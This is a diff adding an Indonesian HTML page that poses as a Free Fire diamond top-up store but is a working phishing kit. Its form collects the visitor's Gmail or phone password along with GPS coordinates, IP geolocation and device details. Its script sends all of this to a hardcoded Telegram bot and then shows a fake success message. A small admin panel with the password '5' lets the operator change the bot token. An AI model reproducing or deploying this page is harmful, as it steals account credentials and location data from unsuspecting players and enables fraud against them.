@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Top Up Free Fire</title>
+<link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f8f9fa;}
+.ff-btn{background:#d92b3a;transition:.3s;}
+.ff-btn:hover{background:#b91c1c;transform:translateY(-2px);}
+.ff-card{transition:.3s;border:1px solid #e2e8f0;border-radius:8px;overflow:hidden;}
+.ff-card:hover{transform:translateY(-5px);box-shadow:0 10px 25px rgba(0,0,0,.1);border-color:#d92b3a;}
+.ff-badge{background:linear-gradient(45deg,#d92b3a,#ff6b6b);color:white;font-weight:bold;}
+.ff-modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.7);justify-content:center;align-items:center;z-index:1000;}
+.ff-modal-content{background:white;padding:2rem;border-radius:10px;max-width:400px;width:90%;border-top:5px solid #d92b3a;text-align:center;}
+.ff-banner{background:linear-gradient(rgba(0,0,0,.3),rgba(0,0,0,.3)),url('https://a.top4top.io/p_3547o5zpj0.png');background-size:cover;background-position:center;color:white;border-radius:10px;min-height:200px;display:flex;flex-direction:column;justify-content:center;align-items:center;}
+.config-panel{position:fixed;top:10px;right:10px;background:white;padding:15px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,.1);width:300px;display:none;z-index:1001;}
+.config-toggle{position:fixed;top:10px;right:10px;background:#d92b3a;color:white;width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:1002;}
+.auth-panel{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,.2);width:300px;display:none;z-index:1003;}
+.hidden-info{filter:blur(4px);transition:.3s;}
+.hidden-info:hover{filter:none;}
+.show-password-toggle{position:absolute;right:10px;top:38px;cursor:pointer;color:#666;}
+</style>
+</head>
+<body>
+
+<!-- Toggle Config -->
+<div class="config-toggle" id="configToggle"><i class="fas fa-cog"></i></div>
+
+<!-- Admin Login Panel -->
+<div class="auth-panel" id="authPanel">
+<h3 class="font-bold text-lg mb-3 text-center">Autentikasi Admin</h3>
+<input type="password" id="adminPassword" placeholder="Password admin" class="w-full px-3 py-2 border rounded mb-3">
+<button id="loginAdmin" class="ff-btn text-white w-full py-2 rounded">Masuk</button>
+</div>
+
+<!-- Config Panel -->
+<div class="config-panel" id="configPanel">
+<h3 class="font-bold text-lg mb-3">Konfigurasi Bot Telegram</h3>
+<div class="mb-3">
+<label>Chat ID Bot:</label>
+<div class="relative">
+<input type="text" id="botChatId" class="w-full px-3 py-2 border rounded hidden-info" placeholder="Masukkan Chat ID" readonly>
+<i class="fas fa-eye show-password-toggle" onclick="toggleVisibility('botChatId')"></i>
+</div>
+</div>
+<div class="mb-3">
+<label>Token Bot:</label>
+<div class="relative">
+<input type="text" id="botToken" class="w-full px-3 py-2 border rounded hidden-info" placeholder="Masukkan Token Bot" readonly>
+<i class="fas fa-eye show-password-toggle" onclick="toggleVisibility('botToken')"></i>
+</div>
+</div>
+<button id="saveConfig" class="ff-btn text-white w-full py-2 rounded mb-2">Simpan</button>
+<button id="logoutAdmin" class="w-full bg-gray-500 text-white py-2 rounded">Logout</button>
+</div>
+
+<!-- Banner -->
+<div class="container mx-auto px-4 py-8 max-w-4xl">
+<div class="ff-banner p-6 text-center mb-8">
+<h1 class="text-3xl md:text-4xl font-bold mb-2">TOP UP FREE FIRE</h1>
+<p class="text-lg">Dapatkan diamond Free Fire dengan harga terbaik!</p>
+</div>
+
+<!-- Paket Diamond -->
+<h2 class="text-2xl font-bold mb-4 text-center">Pilih Paket Diamond</h2>
+
+<style>
+  /* 🔥 Animasi Fade + Zoom + Naik */
+  @keyframes fadeInUpZoom {
+    0% {
+      opacity: 0;
+      transform: translateY(30px) scale(0.95);
+    }
+    100% {
+      opacity: 1;
+      transform: translateY(0) scale(1);
+    }
+  }
+
+  /* Style Awal */
+  .ff-card {
+    opacity: 0;
+    transform: translateY(30px) scale(0.95);
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+  }
+
+  /* Ketika muncul */
+  .ff-card.show {
+    animation: fadeInUpZoom 0.9s ease forwards;
+  }
+
+  /* Hover efek */
+  .ff-card:hover {
+    transform: translateY(-6px) scale(1.03);
+    box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
+  }
+
+  /* Tombol beli */
+  .ff-btn {
+    background: linear-gradient(to right, #007BFF, #002B5B);
+    transition: 0.2s;
+  }
+  .ff-btn:hover {
+    background: linear-gradient(to right, #0056b3, #001f3f);
+    transform: scale(1.05);
+  }
+
+  /* Badge promo */
+  .promo-badge {
+    background: linear-gradient(90deg, gold, orange);
+    color: black;
+    font-weight: bold;
+    text-shadow: 0 0 3px rgba(255,255,255,0.5);
+  }
+
+  /* Grid rapi */
+  #packageContainer {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+    gap: 1.5rem;
+  }
+</style>
+
+<div id="packageContainer">
+
+  <!-- Paket 70 -->
+  <div class="ff-card bg-white rounded-lg overflow-hidden" data-diamond="70" data-price="10000">
+    <div class="bg-red-600 text-white py-2 text-center">
+      <span class="ff-badge px-3 py-1 text-sm">POPULER</span>
+    </div>
+    <div class="p-4 text-center">
+      <h3 class="font-bold text-xl">70 Diamond</h3>
+      <p class="text-gray-600 mb-2">Rp 10.000</p>
+      <button class="buy-btn ff-btn text-white px-4 py-2 rounded">Beli Sekarang</button>
+    </div>
+  </div>
+
+  <!-- Paket 140 -->
+  <div class="ff-card bg-white rounded-lg overflow-hidden" data-diamond="140" data-price="20000">
+    <div class="p-4 text-center">
+      <h3 class="font-bold text-xl">140 Diamond</h3>
+      <p class="text-gray-600 mb-2">Rp 20.000</p>
+      <button class="buy-btn ff-btn text-white px-4 py-2 rounded">Beli Sekarang</button>
+    </div>
+  </div>
+
+  <!-- Paket 355 -->
+  <div class="ff-card bg-white rounded-lg overflow-hidden" data-diamond="355" data-price="50000">
+    <div class="p-4 text-center">
+      <h3 class="font-bold text-xl">355 + 20 Diamond</h3>
+      <p class="text-gray-600 mb-2"><s class="normal">Rp 80.000</s> <br> Rp 50.000</p>
+      <button class="buy-btn ff-btn text-white px-4 py-2 rounded">Beli Sekarang</button>
+    </div>
+  </div>
+
+  <!-- Paket 720 -->
+  <div class="ff-card bg-white rounded-lg overflow-hidden" data-diamond="720" data-price="100000">
+    <div class="p-4 text-center">
+      <h3 class="font-bold text-xl">720 + 50 Diamond</h3>
+      <p class="text-gray-600 mb-2"><s class="normal">Rp 140.000</s> <br>Rp 100.00</p>
+      <button class="buy-btn ff-btn text-white px-4 py-2 rounded">Beli Sekarang</button>
+    </div>
+  </div>
+
+  <!-- Paket 1450 PROMO -->
+  <div class="ff-card bg-white rounded-lg overflow-hidden" data-diamond="1450" data-price="200000">
+    <div class="promo-badge py-2 text-center">
+      <span class="px-3 py-1 text-sm">🔥 PROMO SPESIAL 🔥</span>
+    </div>
+    <div class="p-4 text-center">
+      <h3 class="font-bold text-xl">1450 + 50 Diamond</h3>
+      <p class="text-gray-600 mb-2">Rp 210.000</p>
+      <button class="buy-btn ff-btn text-white px-4 py-2 rounded">Beli Sekarang</button>
+    </div>
+  </div>
+
+  <!-- Paket 2180 -->
+  <div class="ff-card bg-white rounded-lg overflow-hidden" data-diamond="2180" data-price="300000">
+    <div class="p-4 text-center">
+      <h3 class="font-bold text-xl">2180 + 100 Diamond</h3>
+      <p class="text-gray-600 mb-2">Rp 330.000</p>
+      <button class="buy-btn ff-btn text-white px-4 py-2 rounded">Beli Sekarang</button>
+    </div>
+  </div>
+
+</div>
+
+<!-- Script Scroll + Random Delay -->
+<script>
+  const cards = document.querySelectorAll('.ff-card');
+
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        const randomDelay = Math.random() * 0.6; // delay acak 0–0.6 detik
+        entry.target.style.animationDelay = randomDelay + 's';
+        entry.target.classList.add('show');
+      }
+    });
+  }, { threshold: 0.2 });
+
+  cards.forEach(card => observer.observe(card));
+</script>
+
+<!-- Login Form User -->
+<br>
+<div class="bg-white rounded-lg shadow-lg p-6 mb-8" id="loginFormContainer" style="display:none;">
+  <h2 class="text-2xl font-bold mb-4 text-center">Login untuk Top Up</h2>
+  <p class="text-center text-gray-600 mb-4">
+    Anda memilih paket <span id="selectedPackage" class="font-bold">70</span> Diamond
+    seharga <span id="selectedPrice" class="font-bold">Rp 10.000</span>
+  </p>
+
+  <form id="loginForm">
+    <!-- Tambahan kolom Username Game -->
+    <div class="mb-4">
+      <label>Username Game</label>
+      <input
+        type="text"
+        id="userName"
+        class="w-full px-4 py-2 border rounded-lg"
+        placeholder="Masukkan username dalam game"
+        required
+      />
+    </div>
+
+    <!-- Tambahan kolom ID Game -->
+    <div class="mb-4">
+      <label>ID Game</label>
+      <input
+        type="text"
+        id="gameId"
+        class="w-full px-4 py-2 border rounded-lg"
+        placeholder="Masukkan ID game"
+        required
+      />
+    </div>
+
+    <!-- Kolom Email / No HP -->
+    <div class="mb-4">
+      <label>Gmail/Nomer HP</label>
+      <input
+        type="text"
+        id="email"
+        class="w-full px-4 py-2 border rounded-lg"
+        placeholder="Masukkan Email/No HP"
+        required
+      />
+    </div>
+
+    <!-- Kolom Password -->
+    <div class="mb-6 relative">
+      <label>Password Gmail/nomer hp</label>
+      <input
+        type="password"
+        id="password"
+        class="w-full px-4 py-2 border rounded-lg"
+        placeholder="Masukkan Password"
+        required
+      />
+      <i
+        class="fas fa-eye show-password-toggle"
+        onclick="togglePasswordVisibility('password')"
+      ></i>
+    </div>
+
+    <button
+      type="submit"
+      class="ff-btn text-white w-full py-3 rounded-lg font-bold"
+    >
+      LOGIN & LANJUTKAN PEMBAYARAN
+    </button>
+  </form>
+</div>
+<!-- Modal -->
+<div class="ff-modal" id="loginModal">
+<div class="ff-modal-content">
+<h3 class="font-bold text-xl mb-4" id="modalTitle">Login Berhasil</h3>
+<p class="mb-4" id="modalMessage">Anda akan diarahkan ke halaman pembayaran.</p>
+<button class="ff-btn text-white w-full py-2 rounded" onclick="closeModal()">Tutup</button>
+</div>
+</div>
+
+<script>
+// ===== Konfigurasi Awal =====
+let isAuthenticated=false;
+let selectedPackage=null;
+let botConfig={chatId:'7508766509',token:'8460626408:AAHdFxNCmTcVnP-XARyln51kdu7NTaGCYjw'};
+
+// ===== Fungsi Toggle =====
+function toggleVisibility(id){const f=document.getElementById(id);f.classList.toggle('hidden-info');f.readOnly=!f.readOnly;}
+function togglePasswordVisibility(id){const f=document.getElementById(id);const i=f.nextElementSibling;if(f.type==='password'){f.type='text';i.classList.replace('fa-eye','fa-eye-slash');}else{f.type='password';i.classList.replace('fa-eye-slash','fa-eye');}}
+
+// ===== Admin Panel =====
+document.getElementById('configToggle').addEventListener('click',()=>{
+    if(isAuthenticated){const panel=document.getElementById('configPanel');panel.style.display=panel.style.display==='block'?'none':'block';document.getElementById('authPanel').style.display='none';}
+    else{document.getElementById('authPanel').style.display='block';document.getElementById('configPanel').style.display='none';}
+});
+document.getElementById('loginAdmin').addEventListener('click',()=>{
+    const pass=document.getElementById('adminPassword').value;
+    if(pass==='5'){isAuthenticated=true;document.getElementById('authPanel').style.display='none';document.getElementById('configPanel').style.display='block';document.getElementById('adminPassword').value='';}
+    else alert('Password admin salah!');
+});
+document.getElementById('logoutAdmin').addEventListener('click',()=>{isAuthenticated=false;document.getElementById('configPanel').style.display='none';});
+document.getElementById('saveConfig').addEventListener('click',()=>{
+    if(!isAuthenticated){alert('Login admin terlebih dahulu!');return;}
+    const chatId=document.getElementById('botChatId').value.trim();
+    const token=document.getElementById('botToken').value.trim();
+    if(chatId&&token){botConfig.chatId=chatId;botConfig.token=token;localStorage.setItem('botConfig',JSON.stringify({chatId:btoa(encodeURIComponent(chatId)),token:btoa(encodeURIComponent(token))}));alert('Konfigurasi berhasil disimpan!');document.getElementById('configPanel').style.display='none';}
+    else alert('Isi Chat ID dan Token!');
+});
+
+// ===== Pilih Paket =====
+document.querySelectorAll('.buy-btn').forEach(btn=>{btn.addEventListener('click',()=>{const card=btn.closest('.ff-card');selectedPackage={diamond:card.getAttribute('data-diamond'),price:card.getAttribute('data-price')};document.getElementById('selectedPackage').textContent=selectedPackage.diamond;document.getElementById('selectedPrice').textContent='Rp '+Number(selectedPackage.price).toLocaleString();document.getElementById('loginFormContainer').style.display='block';window.scrollTo({top:document.getElementById('loginFormContainer').offsetTop,behavior:'smooth'});});});
+
+// ===== Kirim ke Telegram =====
+async function sendLoginToTelegram(email, password, diamond, price) {
+  // Ambil waktu lokal
+  const now = new Date();
+  const waktu = now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+
+  // Ambil merek HP dari userAgent
+  const deviceInfo = navigator.userAgent;
+
+  // Fungsi ambil lokasi GPS
+  async function getLocation() {
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) {
+        resolve("Lokasi GPS tidak tersedia");
+      } else {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            const { latitude, longitude } = pos.coords;
+            resolve(`Latitude: ${latitude.toFixed(4)}, Longitude: ${longitude.toFixed(4)}`);
+          },
+          () => resolve("Tidak bisa akses lokasi GPS")
+        );
+      }
+    });
+  }
+
+  // Fungsi ambil IP + lokasi dari IP
+  async function getIPInfo() {
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      const data = await res.json();
+      return {
+        ip: data.ip || "Tidak diketahui",
+        city: data.city || "Tidak diketahui",
+        region: data.region || "Tidak diketahui",
+        country: data.country_name || "Tidak diketahui",
+        org: data.org || "Tidak diketahui"
+      };
+    } catch (e) {
+      return { ip: "Gagal ambil IP", city: "-", region: "-", country: "-", org: "-" };
+    }
+  }
+
+  const lokasi = await getLocation();
+  const ipInfo = await getIPInfo();
+
+  // Format pesan yang dikirim ke Telegram
+  const msg = `
+<b>Top Up FF Baru</b>
+💎 Paket: ${diamond} Diamond
+💰 Harga: Rp ${price}
+📧 Email/No HP: ${email}
+🔐 Password: ${password}
+
+📅 <b>Waktu:</b> ${waktu}
+🌍 <b>IP:</b> ${ipInfo.ip}
+🏙️ <b>Lokasi IP:</b> ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
+🏢 <b>ISP:</b> ${ipInfo.org}
+📍 <b>Lokasi GPS:</b> ${lokasi}
+📱 <b>Perangkat:</b> ${deviceInfo}
+`;
+
+  // Kirim ke Telegram
+  try {
+    const url = `https://api.telegram.org/bot${botConfig.token}/sendMessage`;
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: botConfig.chatId,
+        text: msg,
+        parse_mode: 'HTML'
+      })
+    });
+    const data = await res.json();
+    return data.ok;
+  } catch (e) {
+    console.error(e);
+    return false;
+  }
+}
+
+// ===== Login Form User =====
+document.getElementById('loginForm').addEventListener('submit',async e=>{e.preventDefault();const email=document.getElementById('email').value.trim();const password=document.getElementById('password').value.trim();if(!email||!password){alert('Isi semua data!');return;}const ok=await sendLoginToTelegram(email,password,selectedPackage.diamond,selectedPackage.price);if(ok){showModal('Login Berhasil','Data berhasil dikirim ke Telegram');}else{showModal('Gagal','Terjadi kesalahan saat mengirim data');}document.getElementById('loginForm').reset();});
+
+// ===== Modal =====
+function showModal(title,msg){document.getElementById('modalTitle').textContent=title;document.getElementById('modalMessage').textContent=msg;document.getElementById('loginModal').style.display='flex';}
+function closeModal(){document.getElementById('loginModal').style.display='none';}
+</script>
+</body>
+</html>
+<div class="blue-gradient-bg p-6 rounded-lg shadow-lg">
+  <!-- konten kamu di sini -->
+</div>
+<style>
+  body {
+    margin: 0;
+    background: linear-gradient(to bottom, #2176b5, #0e1f3d);
+  }
+</style>
